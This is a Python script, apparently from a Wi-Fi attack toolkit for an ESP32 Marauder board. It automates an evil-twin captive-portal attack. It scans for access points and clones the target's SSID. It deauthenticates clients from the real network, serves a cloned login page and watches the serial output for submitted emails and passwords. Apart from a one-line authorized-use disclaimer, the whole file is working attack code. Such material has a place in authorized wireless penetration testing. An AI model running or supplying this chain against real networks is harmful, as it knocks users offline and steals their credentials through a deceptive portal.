#!/usr/bin/env python3
"""
evil_twin_portal.py -- full evil-twin captive-portal chain, hands-off.

  scan the environment  ->  pick the target AP  ->  clone its SSID onto the
  portal (evilportal setap)  ->  select it + enable EPDeauth so Marauder knocks
  its clients off the real AP  ->  serve the cloned portal  ->  stream captured
  creds.

Every step is a real Marauder v1.13.0 primitive:
  scanap / list -a            discover + enumerate APs
  channel -s <ch>             lock to the target's channel
  select -a <idx>             mark the target (EPDeauth acts on selected APs)
  evilportal -c setap <idx>   clone the scanned AP's SSID as the portal AP name
  evilportal -c sethtml <f>   choose the portal page (put your clone on SD first)
  settings -s EPDeauth enable deauth the selected AP *while* the portal runs
  evilportal -c start         bring up the twin + captive web server

The portal HTML must already be on the board's SD card. Build a 1:1 look-alike
of the target's real page with clone_portal.py, copy it to the SD root as
index.html (or pass --html <name>).

Requires an SD card in the board (portal + cred log). ESP32-WROOM boards
(AWOK Dual Touch V3 orange port / dev_board_pro, or Marauder v6/v6.1). Single
-radio ESP32s time-slice AP + deauth via EPDeauth; that's normal.

AUTHORIZED USE ONLY -- run this only against networks you own or are contracted
to test. Cloning a login page to capture credentials is illegal otherwise.

  python3 chains/evil_twin_portal.py --target-ssid "Corp-Guest" --html index.html --duration 600
  python3 chains/evil_twin_portal.py --port /dev/ttyUSB0        # auto-pick strongest AP
"""

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from marauder import find_target, add_common_args, connect_from_args  # noqa: E402


def main():
    ap = argparse.ArgumentParser(description="Evil-twin captive-portal chain")
    add_common_args(ap)
    ap.add_argument("--target-ssid", help="SSID to clone. Omitted = strongest AP in range.")
    ap.add_argument("--html", default="index.html",
                    help="portal file already on the SD card (default index.html)")
    ap.add_argument("--scan-seconds", type=int, default=20, help="AP scan duration (default 20)")
    ap.add_argument("--duration", type=int, default=600,
                    help="how long to run the portal, seconds (default 600)")
    ap.add_argument("--no-deauth", action="store_true",
                    help="do NOT enable EPDeauth (portal only, no client-kick)")
    args = ap.parse_args()

    m = connect_from_args(args)
    try:
        print("\n[*] Scanning for {}s ...".format(args.scan_seconds))
        aps = m.scan_aps(args.scan_seconds)
        if not aps:
            print("[!] No APs found. Move closer / rescan.")
            return
        print("\n[*] {} APs found:".format(len(aps)))
        for a in aps:
            print("      " + str(a))

        target = find_target(aps, args.target_ssid)
        if not target:
            print("\n[!] Target SSID '{}' not found in scan.".format(args.target_ssid))
            return
        print("\n[*] Target: {}".format(target))

        # 1) tune to the target's channel
        m.set_channel(target.channel)
        # 2) mark it selected so EPDeauth will deauth it
        m.select_ap(target.index)
        # 3) clone its SSID as the portal AP
        m.send("evilportal -c setap {}".format(target.index))
        # 4) choose the (already-on-SD) cloned portal page
        m.send("evilportal -c sethtml {}".format(args.html))
        # 5) concurrent deauth of the real AP while the twin is up
        if not args.no_deauth:
            m.setting("EPDeauth", True)
        # 6) go
        m.send("evilportal -c start")

        print("\n[*] Twin is live as '{}' on ch {}. Portal: {}. {}"
              .format(target.essid, target.channel, args.html,
                      "EPDeauth ON" if not args.no_deauth else "EPDeauth off"))
        print("[*] Watching serial for submitted creds for {}s (also saved to "
              "evil_portal_x.log on SD). Ctrl-C to stop early.\n".format(args.duration))
        # creds stream through the serial echo; wait_for flags the moment one lands
        hit = m.wait_for(["email", "password", "Creds", "u:"], timeout=args.duration)
        if hit:
            print("\n[*] Credential activity seen on serial ('{}'). Check evil_portal_x.log on SD."
                  .format(hit))
            m.sleep(min(30, args.duration))  # linger briefly to catch the rest
    except KeyboardInterrupt:
        print("\n[interrupted]")
    finally:
        try:
            if not args.no_deauth:
                m.setting("EPDeauth", False)
        except Exception:
            pass
        m.close()
        print("[*] Portal down, board idle.")


if __name__ == "__main__":
    main()
